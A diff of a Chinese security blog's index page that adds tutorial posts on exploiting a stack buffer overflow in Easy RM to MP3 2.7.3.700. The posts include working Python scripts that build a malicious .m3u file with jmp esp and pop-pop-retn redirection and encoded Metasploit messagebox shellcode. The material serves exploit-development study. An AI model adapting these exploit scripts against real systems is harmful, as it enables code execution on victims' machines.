+<li>pop retn/popad<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">popad 0x61</span><br><span class="line">pop eax 58</span><br><span class="line">pop ebx 5b</span><br><span class="line">pop ecx 59</span><br><span class="line">pop edx 5a</span><br><span class="line">pop esi 5e</span><br><span class="line">pop ebp 5d</span><br><span class="line">retn    C3</span><br><span class="line"></span><br><span class="line">python 脚本</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">with open(&quot;crash.m3u&quot;,&quot;w+&quot;) as f:</span><br><span class="line">    f.write(&quot;\x41&quot; * (25000+1067))</span><br><span class="line">    f.write(&quot;\x5C\xDF\x80\x7C&quot; ) #eip pop pop retn</span><br><span class="line">    f.write(&quot;\x90&quot; *4 ) #retn4</span><br><span class="line">    f.write(&quot;\xCC&quot;)</span><br><span class="line">    f.write(&quot;\x90&quot; * 6)</span><br><span class="line">    f.write(&quot;\xCC&quot;)</span><br><span class="line">    f.write(&quot;\x31\xae\x80\x7c&quot; ) #eip jmp esp</span><br><span class="line">    f.write(&quot;\x90&quot; * 25) #必须 如果确实这些会shellcode会执行错误</span><br><span class="line">    buf = &quot;&quot;</span><br><span class="line">    buf += &quot;\x89\xe7\xdd\xc1\xd9\x77\xf4\x5e\x56\x59\x49\x49\x49&quot;</span><br><span class="line">    buf += &quot;\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33&quot;</span><br><span class="line">    buf += &quot;\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41&quot;</span><br><span class="line">    buf += &quot;\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41&quot;</span><br><span class="line">    buf += &quot;\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a&quot;</span><br><span class="line">    buf += &quot;\x4a\x49\x58\x59\x4a\x4b\x4d\x4b\x38\x59\x34\x34\x36&quot;</span><br><span class="line">    buf += &quot;\x44\x4b\x44\x30\x31\x39\x42\x4f\x42\x33\x47\x46\x51&quot;</span><br><span class="line">    buf += &quot;\x48\x49\x33\x54\x4c\x4b\x32\x51\x56\x50\x4c\x4b\x52&quot;</span><br><span class="line">    buf += &quot;\x56\x34\x4c\x4c\x4b\x33\x46\x55\x4c\x4c\x4b\x37\x36&quot;</span><br><span class="line">    buf += &quot;\x53\x38\x4c\x4b\x53\x4e\x47\x50\x4c\x4b\x46\x56\x46&quot;</span><br><span class="line">    buf += &quot;\x58\x50\x4f\x45\x48\x44\x35\x4c\x33\x46\x39\x45\x51&quot;</span><br><span class="line">    buf += &quot;\x48\x51\x4b\x4f\x4b\x51\x55\x30\x4c\x4b\x42\x4c\x57&quot;</span><br><span class="line">    buf += &quot;\x54\x31\x34\x4c\x4b\x37\x35\x47\x4c\x4c\x4b\x56\x34&quot;</span><br><span class="line">    buf += &quot;\x36\x48\x32\x58\x35\x51\x4b\x5a\x4c\x4b\x30\x4a\x45&quot;</span><br><span class="line">    buf += &quot;\x48\x4c\x4b\x51\x4a\x51\x30\x55\x51\x4a\x4b\x5a\x43&quot;</span><br><span class="line">    buf += &quot;\x30\x34\x30\x49\x4c\x4b\x46\x54\x4c\x4b\x35\x51\x4a&quot;</span><br><span class="line">    buf += &quot;\x4e\x46\x51\x4b\x4f\x50\x31\x4f\x30\x4b\x4c\x4e\x4c&quot;</span><br><span class="line">    buf += &quot;\x4d\x54\x39\x50\x52\x54\x33\x37\x49\x51\x38\x4f\x44&quot;</span><br><span class="line">    buf += &quot;\x4d\x35\x51\x49\x57\x5a\x4b\x4c\x34\x57\x4b\x43\x4c&quot;</span><br><span class="line">    buf += &quot;\x31\x34\x47\x58\x32\x55\x4d\x31\x4c\x4b\x30\x5a\x57&quot;</span><br><span class="line">    buf += &quot;\x54\x53\x31\x4a\x4b\x42\x46\x4c\x4b\x54\x4c\x30\x4b&quot;</span><br><span class="line">    buf += &quot;\x4c\x4b\x50\x5a\x35\x4c\x53\x31\x5a\x4b\x4c\x4b\x35&quot;</span><br><span class="line">    buf += &quot;\x54\x4c\x4b\x35\x51\x4b\x58\x4d\x59\x30\x44\x51\x34&quot;</span><br><span class="line">    buf += &quot;\x45\x4c\x45\x31\x49\x53\x48\x32\x43\x38\x47\x59\x49&quot;</span><br><span class="line">    buf += &quot;\x44\x4d\x59\x4d\x35\x4c\x49\x59\x52\x33\x58\x4c\x4e&quot;</span><br><span class="line">    buf += &quot;\x30\x4e\x54\x4e\x4a\x4c\x51\x42\x4d\x38\x4d\x4f\x4b&quot;</span><br><span class="line">    buf += &quot;\x4f\x4b\x4f\x4b\x4f\x4c\x49\x50\x45\x34\x44\x4f\x4b&quot;</span><br><span class="line">    buf += &quot;\x43\x4e\x49\x48\x4d\x32\x52\x53\x4c\x47\x45\x4c\x57&quot;</span><br><span class="line">    buf += &quot;\x54\x31\x42\x4b\x58\x4c\x4e\x4b\x4f\x4b\x4f\x4b\x4f&quot;</span><br><span class="line">    buf += &quot;\x4b\x39\x30\x45\x34\x48\x32\x48\x52\x4c\x32\x4c\x51&quot;</span><br><span class="line">    buf += &quot;\x30\x51\x51\x45\x38\x57\x43\x36\x52\x46\x4e\x33\x54&quot;</span><br><span class="line">    buf += &quot;\x35\x38\x32\x55\x34\x33\x43\x55\x34\x32\x46\x50\x49&quot;</span><br><span class="line">    buf += &quot;\x4b\x4c\x48\x31\x4c\x46\x44\x55\x5a\x4b\x39\x4d\x36&quot;</span><br><span class="line">    buf += &quot;\x50\x56\x4b\x4f\x46\x35\x54\x44\x4c\x49\x58\x42\x50&quot;</span><br><span class="line">    buf += &quot;\x50\x4f\x4b\x49\x38\x39\x32\x50\x4d\x4f\x4c\x4c\x47&quot;</span><br><span class="line">    buf += &quot;\x45\x4c\x57\x54\x46\x32\x4a\x48\x51\x4f\x4b\x4f\x4b&quot;</span><br><span class="line">    buf += &quot;\x4f\x4b\x4f\x35\x38\x42\x4f\x43\x48\x56\x38\x57\x50&quot;</span><br><span class="line">    buf += &quot;\x45\x38\x43\x51\x42\x47\x45\x35\x31\x52\x35\x38\x30&quot;</span><br><span class="line">    buf += &quot;\x4d\x43\x55\x54\x33\x43\x43\x50\x31\x59\x4b\x4b\x38&quot;</span><br><span class="line">    buf += &quot;\x51\x4c\x36\x44\x35\x5a\x4c\x49\x5a\x43\x53\x58\x30&quot;</span><br><span class="line">    buf += &quot;\x58\x37\x50\x51\x30\x51\x30\x52\x48\x50\x4d\x36\x33&quot;</span><br><span class="line">    buf += &quot;\x51\x56\x31\x31\x35\x38\x53\x42\x42\x4f\x52\x4d\x47&quot;</span><br><span class="line">    buf += &quot;\x50\x35\x38\x42\x4f\x46\x4c\x47\x50\x45\x36\x45\x38&quot;</span><br><span class="line">    buf += &quot;\x57\x38\x42\x45\x32\x4c\x42\x4c\x50\x31\x58\x49\x4c&quot;</span><br><span class="line">    buf += &quot;\x48\x50\x4c\x57\x54\x34\x50\x4c\x49\x4d\x31\x50\x31&quot;</span><br><span class="line">    buf += &quot;\x38\x52\x36\x32\x56\x33\x56\x31\x46\x32\x4b\x4f\x4e&quot;</span><br><span class="line">    buf += &quot;\x30\x36\x51\x49\x50\x36\x30\x4b\x4f\x50\x55\x53\x38&quot;</span><br><span class="line">    buf += &quot;\x41\x41&quot;</span><br><span class="line">    f.write(buf)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>当缓冲区起始于栈顶下方时,可以使用一系列的POP指令和RET指令,来使字节弹出zhan,ESP指针越来越接近shellcode,当最后执行RET会将shellcode地址压入EIP</p>
+<ul>
+<li><p>push return</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">push esp 54</span><br><span class="line">retn     C3</span><br><span class="line"></span><br><span class="line">当寄存器指向shellcode,但是没有jump Reg/call Reg,则可以通过push Reg</span><br><span class="line">retn</span><br><span class="line">由于retn会将Reg的内容压入Eip</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">with open(&quot;crash.m3u&quot;,&quot;w+&quot;) as f:</span><br><span class="line">    f.write(&quot;\x41&quot; * (25000+1067))</span><br><span class="line">    f.write(&quot;\x5C\xDF\x80\x7C&quot; ) #pop pop retn</span><br><span class="line">    f.write(&quot;\x90&quot; *4 ) #retn4</span><br><span class="line">    f.write(&quot;\xCC&quot;)</span><br><span class="line">    f.write(&quot;\x90&quot; * 6)</span><br><span class="line">    f.write(&quot;\xCC&quot;)</span><br><span class="line">    f.write(&quot;\x72\x1E\x81\x7c&quot; ) #eip push esp retn</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>jmp [reg + offset]</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">寄存器指向包含shellcode地址的缓冲区,但是没有指向入口,通过指向</span><br><span class="line">jmp [Reg+offset]跳转到入口</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>SHE<br>通过自己的地址去覆盖SHE,迫使跳转至shellcode,但是需要处理safeShe以及SHEOP</p>
+</li>
+<li><p>应对狭窄型缓冲区<br>利用跳转指令跳至任意地址</p>
+</li>
+<li><p>short jumps/conditional jumps</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jmp short 0xeb</span><br><span class="line"></span><br><span class="line">条件跳转:</span><br><span class="line">根据EFLAGS寄存器的状态来实现跳转</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">shellcode</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/10/20/exploit_2_迫使shellcode执行方法/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-exploit_1_缓冲区溢出" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/19/exploit_1_缓冲区溢出/">exploit_1_缓冲区溢出</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/10/19/exploit_1_缓冲区溢出/" class="archive-article-date">
+  	<time datetime="2018-10-19T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-19</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>实验版本:<br>windows sp2<br>Easy RM to MP3 2.7.3.700<br>ollydbg</p>
+<blockquote>
+<p>验证漏洞存在</p>
+</blockquote>
+<ol>
+<li><p>使用python脚本创建一个m3u文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">#分别尝试10000,20000,30000,发现30000时候才会发生内存访问异常</span><br><span class="line">with open(&quot;crash.m3u&quot;,&quot;w+&quot;) as f:</span><br><span class="line">    #for i in range(0,30000):</span><br><span class="line">    f.write(&quot;\x41&quot; * 30000)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用Easy RM to MP3载入文件<br>0x41414141即为AAAA,所以很有可能是由于缓冲区溢出导致访问了AAAA的地址<br><img src="http://picture.jbyusk.com:8080/exploit1-10/exploit1.png" alt=""></p>
+</li>
+</ol>
+<blockquote>
+<p>确定EIP返回地址</p>
+</blockquote>
+<p>1.尝试使用二分法缩小范围<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;crash.m3u&quot;,&quot;w+&quot;) as f:</span><br><span class="line">    f.write(&quot;\x41&quot; * 25000)</span><br><span class="line">    f.write(&quot;\x42&quot; * 5000)</span><br></pre></td></tr></table></figure></p>
+<p>确定为返回地址在25000到30000之间<br><img src="http://picture.jbyusk.com:8080/exploit1-10/exploit2.png" alt=""></p>
+<ol>
+<li>使用msfconsole生成5000个字节<br>./pattern_create.rb -l 5000 #复制到最后5000个字节</li>
+<li><p>确认EIP位置<br>使用ollydbg再次执行发现eip为366A4235<br>./pattern_offset.rb -q 0x366A4235<br>[*] Exact match at offset 1067 #获得位置在1067</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">with open(&quot;crash.m3u&quot;,&quot;w+&quot;) as f:</span><br><span class="line">    f.write(&quot;\x41&quot; * (25000+1067))</span><br><span class="line">    f.write(&quot;\x42&quot; *4)</span><br></pre></td></tr></table></figure>
+<p>ollydbg异常eip为42424242</p>
+</li>
+</ol>
+<blockquote>
+<p>编写shellcode</p>
+</blockquote>
+<ol>
+<li>确认shellcode存放位置<br>通过观察od,发现esp指向的位置再返回地址+4的位置,之所以+4是因为该函数参数最后执行retn 4.<br>所以可以确认可以将shellcode放置再esp位置,然后通过jmp esp(FF E4)跳转过去.<br>所以eip地址应该存一个指向jmp esp的地址,最好寻找软件自带的dll作为跳转地址.<br>选择MSRMCcodec02.dll,调整到该模块使用查找命令,找到一个地址0x023FF23A(注意地址不能包含00,否则会发送字符串结束,shellcode会被截断)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">with open(&quot;crash.m3u&quot;,&quot;w+&quot;) as f:</span><br><span class="line">    f.write(&quot;\x41&quot; * (25000+1067))</span><br><span class="line">    f.write(&quot;\x3A\xF2\x3F\x02&quot; ) #eip</span><br><span class="line">    f.write(&quot;\x90&quot; *25)</span><br><span class="line">    f.write(&quot;\xCC&quot;)</span><br><span class="line">    f.write(&quot;\x90&quot; *25)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>执行后发现发生中断在int 3</p>
+<ul>
+<li>使用metasploit生成messagebox的shellcode<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use payload/windows/messagebox</span><br><span class="line">generate -b &quot;\x00&quot; -e x86/alpha_upper -t python</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">with open(&quot;crash.m3u&quot;,&quot;w+&quot;) as f:</span><br><span class="line">    f.write(&quot;\x41&quot; * (25000+1067))</span><br><span class="line">    f.write(&quot;\x3A\xF2\x3F\x02&quot; ) #eip</span><br><span class="line">    f.write(&quot;\x90&quot; * 25 )</span><br><span class="line">    buf = &quot;&quot;</span><br><span class="line">    buf += &quot;\x89\xe7\xdd\xc1\xd9\x77\xf4\x5e\x56\x59\x49\x49\x49&quot;</span><br><span class="line">    buf += &quot;\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33&quot;</span><br><span class="line">    buf += &quot;\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41&quot;</span><br><span class="line">    buf += &quot;\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41&quot;</span><br><span class="line">    buf += &quot;\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a&quot;</span><br><span class="line">    buf += &quot;\x4a\x49\x58\x59\x4a\x4b\x4d\x4b\x38\x59\x34\x34\x36&quot;</span><br><span class="line">    buf += &quot;\x44\x4b\x44\x30\x31\x39\x42\x4f\x42\x33\x47\x46\x51&quot;</span><br><span class="line">    buf += &quot;\x48\x49\x33\x54\x4c\x4b\x32\x51\x56\x50\x4c\x4b\x52&quot;</span><br><span class="line">    buf += &quot;\x56\x34\x4c\x4c\x4b\x33\x46\x55\x4c\x4c\x4b\x37\x36&quot;</span><br><span class="line">    buf += &quot;\x53\x38\x4c\x4b\x53\x4e\x47\x50\x4c\x4b\x46\x56\x46&quot;</span><br><span class="line">    buf += &quot;\x58\x50\x4f\x45\x48\x44\x35\x4c\x33\x46\x39\x45\x51&quot;</span><br><span class="line">    buf += &quot;\x48\x51\x4b\x4f\x4b\x51\x55\x30\x4c\x4b\x42\x4c\x57&quot;</span><br><span class="line">    buf += &quot;\x54\x31\x34\x4c\x4b\x37\x35\x47\x4c\x4c\x4b\x56\x34&quot;</span><br><span class="line">    buf += &quot;\x36\x48\x32\x58\x35\x51\x4b\x5a\x4c\x4b\x30\x4a\x45&quot;</span><br><span class="line">    buf += &quot;\x48\x4c\x4b\x51\x4a\x51\x30\x55\x51\x4a\x4b\x5a\x43&quot;</span><br><span class="line">    buf += &quot;\x30\x34\x30\x49\x4c\x4b\x46\x54\x4c\x4b\x35\x51\x4a&quot;</span><br><span class="line">    buf += &quot;\x4e\x46\x51\x4b\x4f\x50\x31\x4f\x30\x4b\x4c\x4e\x4c&quot;</span><br><span class="line">    buf += &quot;\x4d\x54\x39\x50\x52\x54\x33\x37\x49\x51\x38\x4f\x44&quot;</span><br><span class="line">    buf += &quot;\x4d\x35\x51\x49\x57\x5a\x4b\x4c\x34\x57\x4b\x43\x4c&quot;</span><br><span class="line">    buf += &quot;\x31\x34\x47\x58\x32\x55\x4d\x31\x4c\x4b\x30\x5a\x57&quot;</span><br><span class="line">    buf += &quot;\x54\x53\x31\x4a\x4b\x42\x46\x4c\x4b\x54\x4c\x30\x4b&quot;</span><br><span class="line">    buf += &quot;\x4c\x4b\x50\x5a\x35\x4c\x53\x31\x5a\x4b\x4c\x4b\x35&quot;</span><br><span class="line">    buf += &quot;\x54\x4c\x4b\x35\x51\x4b\x58\x4d\x59\x30\x44\x51\x34&quot;</span><br><span class="line">    buf += &quot;\x45\x4c\x45\x31\x49\x53\x48\x32\x43\x38\x47\x59\x49&quot;</span><br><span class="line">    buf += &quot;\x44\x4d\x59\x4d\x35\x4c\x49\x59\x52\x33\x58\x4c\x4e&quot;</span><br><span class="line">    buf += &quot;\x30\x4e\x54\x4e\x4a\x4c\x51\x42\x4d\x38\x4d\x4f\x4b&quot;</span><br><span class="line">    buf += &quot;\x4f\x4b\x4f\x4b\x4f\x4c\x49\x50\x45\x34\x44\x4f\x4b&quot;</span><br><span class="line">    buf += &quot;\x43\x4e\x49\x48\x4d\x32\x52\x53\x4c\x47\x45\x4c\x57&quot;</span><br><span class="line">    buf += &quot;\x54\x31\x42\x4b\x58\x4c\x4e\x4b\x4f\x4b\x4f\x4b\x4f&quot;</span><br><span class="line">    buf += &quot;\x4b\x39\x30\x45\x34\x48\x32\x48\x52\x4c\x32\x4c\x51&quot;</span><br><span class="line">    buf += &quot;\x30\x51\x51\x45\x38\x57\x43\x36\x52\x46\x4e\x33\x54&quot;</span><br><span class="line">    buf += &quot;\x35\x38\x32\x55\x34\x33\x43\x55\x34\x32\x46\x50\x49&quot;</span><br><span class="line">    buf += &quot;\x4b\x4c\x48\x31\x4c\x46\x44\x55\x5a\x4b\x39\x4d\x36&quot;</span><br><span class="line">    buf += &quot;\x50\x56\x4b\x4f\x46\x35\x54\x44\x4c\x49\x58\x42\x50&quot;</span><br><span class="line">    buf += &quot;\x50\x4f\x4b\x49\x38\x39\x32\x50\x4d\x4f\x4c\x4c\x47&quot;</span><br><span class="line">    buf += &quot;\x45\x4c\x57\x54\x46\x32\x4a\x48\x51\x4f\x4b\x4f\x4b&quot;</span><br><span class="line">    buf += &quot;\x4f\x4b\x4f\x35\x38\x42\x4f\x43\x48\x56\x38\x57\x50&quot;</span><br><span class="line">    buf += &quot;\x45\x38\x43\x51\x42\x47\x45\x35\x31\x52\x35\x38\x30&quot;</span><br><span class="line">    buf += &quot;\x4d\x43\x55\x54\x33\x43\x43\x50\x31\x59\x4b\x4b\x38&quot;</span><br><span class="line">    buf += &quot;\x51\x4c\x36\x44\x35\x5a\x4c\x49\x5a\x43\x53\x58\x30&quot;</span><br><span class="line">    buf += &quot;\x58\x37\x50\x51\x30\x51\x30\x52\x48\x50\x4d\x36\x33&quot;</span><br><span class="line">    buf += &quot;\x51\x56\x31\x31\x35\x38\x53\x42\x42\x4f\x52\x4d\x47&quot;</span><br><span class="line">    buf += &quot;\x50\x35\x38\x42\x4f\x46\x4c\x47\x50\x45\x36\x45\x38&quot;</span><br><span class="line">    buf += &quot;\x57\x38\x42\x45\x32\x4c\x42\x4c\x50\x31\x58\x49\x4c&quot;</span><br><span class="line">    buf += &quot;\x48\x50\x4c\x57\x54\x34\x50\x4c\x49\x4d\x31\x50\x31&quot;</span><br><span class="line">    buf += &quot;\x38\x52\x36\x32\x56\x33\x56\x31\x46\x32\x4b\x4f\x4e&quot;</span><br><span class="line">    buf += &quot;\x30\x36\x51\x49\x50\x36\x30\x4b\x4f\x50\x55\x53\x38&quot;</span><br><span class="line">    buf += &quot;\x41\x41&quot;</span><br><span class="line">    f.write(buf)</span><br></pre></td></tr></table></figure>
+<p>结果<br><img src="http://picture.jbyusk.com:8080/exploit1-10/exploit3.png" alt=""></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">shellcode</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/10/19/exploit_1_缓冲区溢出/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
     <article id="post-脱壳基础01" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -741,296 +1072,9 @@
         <!-- 目录内容结束 -->
 
   
-    <article id="post-windows异常与调试" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/windows异常与调试/">异常与调试</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/08/20/windows异常与调试/" class="archive-article-date">
-  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Windows异常处理:<br>SEH-结构化异常处理<br>VEH-向量化异常处理<br>VCH-向量化异常处理</p>
-<blockquote>
-<p>SEH-结构化异常处理</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">__try&#123;&#125;</span><br><span class="line">__finally&#123;&#125; //必定会执行 通过AbnormalTermiantion(void)获取是正常方式还是非正常方式</span><br><span class="line"></span><br><span class="line">__try&#123;&#125;</span><br><span class="line">__except&#123;&#125;</span><br><span class="line"></span><br><span class="line">//EXCEPTION_EXECUTE_HANDLER(1) ：执行异常处理块，不回到异常产生处</span><br><span class="line">//EXCEPTION_CONTINUE_SEARCH(0) ：处理不了，找别人吧</span><br><span class="line">//EXCEPTION_CONTINUE_EXECUTION(-1)：不相信这个事实，再执行一下试试</span><br><span class="line">//GetExceptionCode() 返回异常类型</span><br><span class="line">//GetExceptionInformation() 包含上下文信息 以及异常的类型等信息</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;tchar.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">int 